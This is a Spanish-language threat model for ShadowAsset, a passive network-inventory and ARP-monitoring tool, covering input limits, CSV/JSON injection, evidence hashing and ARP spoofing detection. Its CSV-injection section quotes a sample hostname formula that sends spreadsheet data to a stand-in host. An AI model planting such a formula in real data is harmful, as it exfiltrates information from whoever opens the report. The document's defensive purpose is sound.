# Modelo de amenazas

Este documento describe qué protege ShadowAsset, de quién y cómo. Sigue un enfoque STRIDE simplificado.

## Activos y límites de confianza

| Activo | Por qué importa |
|---|---|
| Inventario de TI (`inventario.csv`) | Define qué está autorizado. Si se altera, un equipo intruso pasaría por "conforme". |
| Instantáneas (`data/historial/`) | Son la evidencia de qué había en la red y cuándo. |
| Informes (`.csv`, `.json`) | Se abren en Excel o se envían a un SIEM; son una vía para atacar a quien los lee. |
| El equipo que ejecuta la herramienta | No debe verse comprometido por procesar datos externos. |

**Límite de confianza:** todo lo que llega de un archivo o de la red es **no confiable**. Eso incluye el hostname que anuncia un dispositivo y un CSV que alguien editó.

## Amenazas y mitigaciones

### 1. Entrada maliciosa que corrompe memoria (Tampering / Elevation)
*Escenario:* un CSV manipulado con líneas enormes, miles de columnas, bytes nulos o comillas sin cerrar, para provocar un desbordamiento de búfer.

*Mitigaciones:*
- Límites explícitos: 16 MB por archivo, 1024 bytes por línea, 32 columnas y 100 000 dispositivos.
- Búferes de tamaño fijo con comprobación de longitud antes de copiar; `snprintf` en lugar de `sprintf`.
- Se rechazan bytes nulos y UTF-16.
- Pruebas con AddressSanitizer y UndefinedBehaviorSanitizer en CI.

### 2. Inyección de fórmulas en Excel (CSV injection)
*Escenario:* un equipo se anuncia con un hostname como `=HYPERLINK("http://malo/?"&A1)`. Cuando un analista abre el informe en Excel, la fórmula se ejecuta y puede filtrar datos.

*Mitigaciones (defensa en profundidad):*
1. La validación del hostname solo acepta `A-Z a-z 0-9 - _ .`, y el primer carácter no puede ser `-` ni `.`.
2. Al exportar, toda celda que empiece por `= + - @ TAB CR` recibe un `'` delante y todas las celdas van entre comillas.

### 3. Inyección en JSON / SIEM
*Escenario:* una ruta o un texto con comillas o caracteres de control rompe el JSON o inyecta campos.

*Mitigación:* un escapado JSON completo (`"`, `\` y caracteres de control como `\u00XX`).

### 4. Manipulación de evidencias (Tampering / Repudiation)
*Escenario:* alguien modifica una instantánea o el inventario después del análisis y alega que el informe era erróneo.

*Mitigaciones:*
- Cada informe JSON registra el **SHA-256** de cada archivo de entrada, la versión y la fecha UTC.
- La huella se calcula sobre el mismo búfer que se analiza. No se lee el archivo dos veces, así que no hay ventana TOCTOU.
- Las salidas se crean con `fopen(..., "wx")`, que falla si el archivo existe. Ninguna ejecución pisa un informe o una instantánea anterior.

> **Límite:** el hash prueba integridad, no autenticidad. Quien pueda reescribir el archivo y el informe a la vez puede falsificar ambos. Para eso harían falta firmas (ver la hoja de ruta).

### 5. Suplantación ARP / man-in-the-middle en la red vigilada (Spoofing)
*Escenario:* un atacante envía respuestas ARP falsas para hacerse pasar por la puerta de enlace.

*Detección:*
- `IP_REASIGNADA` con severidad **ALTA** cuando la IP de la puerta de enlace (detectada automáticamente en `monitor` o dada con `--gateway`) responde con otra MAC.
- `IP_DUPLICADA` (**ALTA**) cuando dos MAC reclaman la misma IP en una medición.

> **Límite:** la detección depende de que la caché ARP de este equipo capture el cambio. Un ataque que dure menos que el intervalo entre mediciones puede pasar desapercibido.

### 6. Evasión mediante MAC falsificada (Spoofing)
*Escenario:* un intruso clona la MAC de un equipo autorizado.

*Detección parcial:* si el clon usa otra IP, aparece como `CAMBIO` o `DISCREPANCIA`. Si el original y el clon conviven, se genera `IP_DUPLICADA` o una IP inesperada.

> **Límite:** un clon perfecto (misma MAC, misma IP, original apagado) es indistinguible a nivel ARP. Detectarlo requiere 802.1X, NAC o *fingerprinting*, que quedan fuera del alcance.

### 7. Uso fuera de alcance o sin autorización
*Escenario:* la herramienta se usa para reconocer una red ajena.

*Mitigaciones:*
- Es **pasiva**: no envía paquetes ni hace DNS ni escaneo, solo lee lo que el sistema ya sabe.
- `--subnet` limita el resultado a la red autorizada.
- No requiere privilegios de administrador.

### 8. Denegación de servicio por volumen
*Escenario:* un archivo gigantesco agota la memoria.

*Mitigación:* los límites del punto 1 y algoritmos O(n log n): ordenación y fusión de listas, e índices ordenados por IP con búsqueda binaria.

## Riesgos aceptados

| Riesgo | Motivo |
|---|---|
| Sin firma criptográfica de informes | Fuera del alcance de v1.0; el SHA-256 cubre la integridad básica. |
| Rutas no ASCII en Windows | Requiere migrar a `wchar_t`/`_wfopen`; está en la hoja de ruta. |
| La alerta `POSIBLE_MISMO_EQUIPO` usa el hostname, que el dispositivo controla | Es de severidad BAJA y solo orienta la revisión. |
